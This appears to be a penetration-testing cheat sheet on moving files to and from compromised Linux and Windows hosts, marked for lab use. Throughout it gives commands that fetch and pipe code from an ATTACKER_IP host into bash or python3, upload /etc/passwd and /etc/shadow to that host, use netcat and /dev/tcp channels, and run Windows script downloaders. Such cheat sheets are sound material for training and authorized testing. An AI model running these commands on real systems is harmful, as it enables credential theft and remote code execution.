# Linux File Transfer

> Lab/authorized testing. Replace `ATTACKER_IP`, paths, usernames, and filenames.

## 1. Base64 — Clipboard / No Network

### Target → Attacker
```bash
# Target
base64 -w 0 /path/file > /tmp/file.b64
cat /tmp/file.b64

# Or directly
cat /path/file | base64 -w 0; echo

# Attacker
cat file.b64 | base64 -d > file
md5sum /path/file
md5sum file
```

### Attacker → Target
```bash
# Attacker
cat file | base64 -w 0; echo

# Target
printf '%s' '<BASE64>' | base64 -d > file
md5sum file
```

---

## 2. wget / cURL — HTTP(S) Download

### wget
```bash
wget http://ATTACKER_IP:8000/file -O /tmp/file
```

### cURL
```bash
curl http://ATTACKER_IP:8000/file -o /tmp/file
```

### Download → Execute (fileless)
```bash
curl http://ATTACKER_IP:8000/script.sh | bash
wget -qO- http://ATTACKER_IP:8000/script.py | python3
```

> `| bash` / `| python3` avoids saving the downloaded script first, but the program itself may still create files.

---

## 3. Start a Simple HTTP Server

### Python 3
```bash
python3 -m http.server 8000
```

### Python 2
```bash
python2.7 -m SimpleHTTPServer 8000
```

### PHP
```bash
php -S 0.0.0.0:8000
```

### Ruby
```bash
ruby -run -ehttpd . -p8000
```

### Download from the server
```bash
wget http://ATTACKER_IP:8000/file
curl http://ATTACKER_IP:8000/file -o file
```

---

## 4. Bash `/dev/tcp` — Raw TCP HTTP Download

```bash
exec 3<>/dev/tcp/ATTACKER_IP/80
echo -e "GET /file HTTP/1.1\r\nHost: ATTACKER_IP\r\nConnection: close\r\n\r\n" >&3
cat <&3
exec 3>&-
```

> Requires a Bash build supporting `/dev/tcp` redirections. This is raw TCP, not a normal HTTP client.

---

## 5. SCP — SSH File Transfer

### Start SSH server on attacker
```bash
sudo systemctl enable ssh
sudo systemctl start ssh
ss -lntp | grep ':22'
```

### Remote Linux → Attacker
```bash
scp USER@TARGET_IP:/remote/path/file /local/path/
```

### Attacker → Remote Linux
```bash
scp /local/path/file USER@TARGET_IP:/remote/path/
```

### Directory transfer
```bash
scp -r USER@TARGET_IP:/remote/path/dir /local/path/
scp -r /local/path/dir USER@TARGET_IP:/remote/path/
```

---

## 6. Web Upload — `uploadserver`

### Attacker: install
```bash
python3 -m pip install --user uploadserver
```

### HTTP upload server
```bash
python3 -m uploadserver 8000
```

### HTTPS upload server (self-signed)
```bash
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
python3 -m uploadserver 443 --server-certificate ~/server.pem
```

### Target → Attacker
```bash
curl -X POST http://ATTACKER_IP:8000/upload \
  -F 'files=@/etc/passwd'
```

### Multiple files
```bash
curl -X POST http://ATTACKER_IP:8000/upload \
  -F 'files=@/etc/passwd' \
  -F 'files=@/etc/shadow'
```

### Self-signed HTTPS
```bash
curl -k -X POST https://ATTACKER_IP:443/upload \
  -F 'files=@/etc/passwd'
```

> `-k` / `--insecure` disables TLS certificate verification.

---

## 7. File Integrity

### MD5
```bash
md5sum file
```

### SHA-256
```bash
sha256sum file
```

### Compare
```bash
md5sum file
sha256sum file
```

---

## Transfer Decision

```text
No network / only shell paste → Base64
HTTP/HTTPS available           → wget / curl
Need fileless script execution → curl|bash / wget|python3
No wget/curl                   → Bash /dev/tcp (if supported)
SSH reachable                  → scp
Need target → attacker upload  → uploadserver + curl
```

## 8. File Transfer with Installed Languages

### Python 2 — Download
```bash
python2.7 -c 'import urllib;urllib.urlretrieve("http://ATTACKER_IP:8000/file","/tmp/file")'
```

### Python 3 — Download
```bash
python3 -c 'import urllib.request;urllib.request.urlretrieve("http://ATTACKER_IP:8000/file","/tmp/file")'
```

### PHP — Download
```bash
php -r '$file=file_get_contents("http://ATTACKER_IP:8000/file");file_put_contents("/tmp/file",$file);'
```

### PHP — Download + Pipe to Bash
```bash
php -r '$lines=@file("http://ATTACKER_IP:8000/script.sh");foreach($lines as $line){echo $line;}' | bash
```

### Ruby — Download
```bash
ruby -e 'require "net/http";File.write("/tmp/file",Net::HTTP.get(URI.parse("http://ATTACKER_IP:8000/file")))'
```

### Perl — Download
```bash
perl -e 'use LWP::Simple;getstore("http://ATTACKER_IP:8000/file","/tmp/file");'
```

### Python 3 — Upload to `uploadserver`
```bash
python3 -m uploadserver 8000
```

```bash
python3 -c 'import requests;requests.post("http://ATTACKER_IP:8000/upload",files={"files":open("/etc/passwd","rb")})'
```

### Python 3 — Upload multiple files
```bash
python3 -c 'import requests;requests.post("http://ATTACKER_IP:8000/upload",files=[("files",open("/etc/passwd","rb")),("files",open("/etc/hosts","rb"))])'
```

---

## 9. Windows — JavaScript / VBScript Downloads

### `wget.js`
```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

### Run JavaScript with `cscript.exe`
```cmd
cscript.exe /nologo wget.js http://ATTACKER_IP:8000/file.exe C:\Users\Public\file.exe
```

### `wget.vbs`
```vbscript
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send
with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

### Run VBScript with `cscript.exe`
```cmd
cscript.exe /nologo wget.vbs http://ATTACKER_IP:8000/file.exe C:\Users\Public\file.exe
```

---

## 10. Start HTTP Server for Language-Based Downloads

```bash
cd /path/to/files
python3 -m http.server 8000
```

```bash
python3 -m http.server 8000 --bind 0.0.0.0
```

### Typical flow
```text
Kali:    python3 -m http.server 8000
Target:  python3 -c 'import urllib.request;urllib.request.urlretrieve("http://ATTACKER_IP:8000/file","/tmp/file")'
```

## Quick Language Reference

```text
Python 3  → python3 -c '...'
Python 2  → python2.7 -c '...'
PHP       → php -r '...'
Ruby      → ruby -e '...'
Perl      → perl -e '...'
Windows JS → cscript.exe /nologo wget.js URL OUTFILE
Windows VBS → cscript.exe /nologo wget.vbs URL OUTFILE
```

# Miscellaneous File Transfer Methods

## Netcat / Ncat

### Target listens → Attacker sends

```bash
# Target - receive file
nc -l -p 8000 > file

# Ncat
ncat -l -p 8000 --recv-only > file
```

```bash
# Attacker - send file
nc -q 0 TARGET_IP 8000 < file

# Ncat
ncat --send-only TARGET_IP 8000 < file
```

### Attacker listens → Target connects

```bash
# Attacker
sudo nc -l -p 443 -q 0 < file

# Target
nc ATTACKER_IP 443 > file
```

```bash
# Attacker - Ncat
sudo ncat -l -p 443 --send-only < file

# Target
ncat ATTACKER_IP 443 --recv-only > file
```

### Bash `/dev/tcp`

```bash
# Attacker
sudo nc -l -p 443 -q 0 < file

# Target
cat < /dev/tcp/ATTACKER_IP/443 > file
```

### Reverse direction

```bash
# Target
nc -q 0 ATTACKER_IP 8000 < file

# Attacker
nc -l -p 8000 > file
```

---

## PowerShell Remoting / WinRM

### Check WinRM

```powershell
Test-NetConnection -ComputerName TARGET -Port 5985
```

### Create session

```powershell
$Session = New-PSSession -ComputerName TARGET
```

### Local → Remote

```powershell
Copy-Item -Path C:\file.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
```

### Remote → Local

```powershell
Copy-Item -Path C:\Users\Administrator\Desktop\file.txt -FromSession $Session -Destination C:\
```

### WinRM ports

```text
5985/tcp = HTTP
5986/tcp = HTTPS
```

---

## RDP File Transfer

### rdesktop - mount local Linux directory

```bash
rdesktop TARGET_IP -d DOMAIN -u USER -p 'PASSWORD' \
-r disk:linux='/home/user/share'
```

### xfreerdp - mount local Linux directory

```bash
xfreerdp /v:TARGET_IP /d:DOMAIN /u:USER /p:'PASSWORD' \
/drive:linux,/home/user/share
```

### Access mounted directory from Windows RDP session

```text
\\tsclient\linux
```

### Native Windows RDP client

```cmd
mstsc
```

Use:

```text
Local Resources → More... → Drives
```

Then access the redirected drive in the RDP session through:

```text
\\tsclient\
```

### Linux

#### OpenSSL — Target → Attacker

```bash
# Attacker
openssl req -newkey rsa:2048 -nodes \
    -keyout key.pem \
    -x509 -days 365 \
    -out certificate.pem

openssl s_server -quiet \
    -accept 80 \
    -cert certificate.pem \
    -key key.pem < /tmp/LinEnum.sh
```

```bash
# Target
openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
```
